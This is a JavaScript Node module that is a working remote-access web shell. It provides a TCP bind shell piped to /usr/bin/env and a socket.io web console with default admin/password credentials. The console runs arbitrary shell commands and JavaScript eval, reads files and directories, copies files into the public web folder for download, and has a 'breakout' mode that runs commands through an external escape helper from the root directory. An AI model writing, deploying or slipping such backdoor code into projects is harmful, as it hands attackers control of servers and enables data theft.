var exec, fs, fusker, getfile, jseval, net, path, spawn, stats, tryfile, util, _ref;

_ref = require('child_process'), exec = _ref.exec, spawn = _ref.spawn;

path = require('path');

fusker = require('fusker');

net = require('net');

util = require('util');

fs = require('fs');

tryfile = function(dir) {
  try {
    return fs.readFileSync(dir || '.');
  } catch (_error) {}
};

getfile = function(dir) {
  if (dir == null) dir = '.';
  return tryfile(dir) || fs.readdirSync(dir);
};

stats = function(dir) {
  var s;
  if (dir == null) dir = '.';
  s = fs.statSync(dir);
  s.mode = s.mode.toString(8);
  return s;
};

jseval = function(cmd) {
  try {
    return eval(cmd);
  } catch (error) {
    return "" + error;
  }
};

module.exports = {
  reverse: function(port) {
    var server, sh;
    sh = spawn('/usr/bin/env', []);
    server = net.createServer(function(c) {
      c.pipe(sh.stdin);
      return util.pump(sh.stdout, c);
    });
    return server.listen(port);
  },
  start: function(port, username, password) {
    var breakf, io, pdir, server;
    if (username == null) username = 'admin';
    if (password == null) password = 'password';
    breakf = path.join(__dirname, "../break");
    pdir = path.join(__dirname, '../public');
    fusker.config.dir = pdir;
    fusker.config.silent = true;
    server = fusker.http.createServer(port, username, password);
    io = fusker.socket.listen(server);
    return io.sockets.on('connection', function(socket) {
      if (socket.cwd == null) socket.cwd = process.cwd();
      socket.emit('cwd', socket.cwd);
      return socket.on('command', function(msg) {
        var cd, dir, execArgs, file, fpath, here;
        if (msg.indexOf('breakout') === 0) {
          socket.cwd = '/';
          socket.emit('cwd', socket.cwd);
          return socket.broken = true;
        }
        if (msg.indexOf('breakin') === 0) {
          socket.cwd = process.cwd();
          socket.emit('cwd', socket.cwd);
          return socket.broken = false;
        }
        if (msg.indexOf('cd ') === 0) {
          cd = msg.split(' ')[1];
          socket.cwd = path.resolve(socket.cwd, cd);
          return socket.emit('cwd', socket.cwd);
        }
        if (msg.indexOf('!dir') === 0) {
          dir = msg.split(' ')[1] || '.';
          here = fs.readdirSync(dir);
          return socket.emit('stdout', here.sort().join("\n"));
        }
        if (msg.indexOf('!get') === 0) {
          dir = msg.split(' ')[1] || '.';
          here = String(getfile(dir));
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!stat') === 0) {
          dir = msg.split(' ')[1] || '.';
          here = (function() {
            try {
              return JSON.stringify(stats(dir));
            } catch (_error) {}
          })();
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!js ') === 0) {
          here = (function() {
            try {
              return JSON.stringify(jseval(msg.replace(/^!js /, "")));
            } catch (_error) {}
          })();
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!echo ') === 0) {
          here = msg.replace(/^!echo /, "");
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('rip ') === 0) {
          file = msg.split(' ')[1];
          fpath = path.resolve(socket.cwd, file);
          msg = "cp " + fpath + " " + pdir;
          socket.emit('stdout', "" + file + " copied");
        }
        if (socket.broken) {
          msg = "PERL_BADLANG=0 " + breakf + " \"" + msg + "\" \"" + socket.cwd + "\"";
          execArgs = {
            cwd: process.cwd()
          };
        } else {
          execArgs = {
            cwd: socket.cwd
          };
        }
        return exec(msg, execArgs, function(err, stdout, stderr) {
          socket.emit('cwd', socket.cwd);
          if ((stdout != null) && stdout !== "") socket.emit('stdout', stdout);
          if ((stderr != null) && stderr !== "") socket.emit('stderr', stderr);
          if ((err != null) && !stderr) return socket.emit('error', err.message);
        });
      });
    });
  }
};
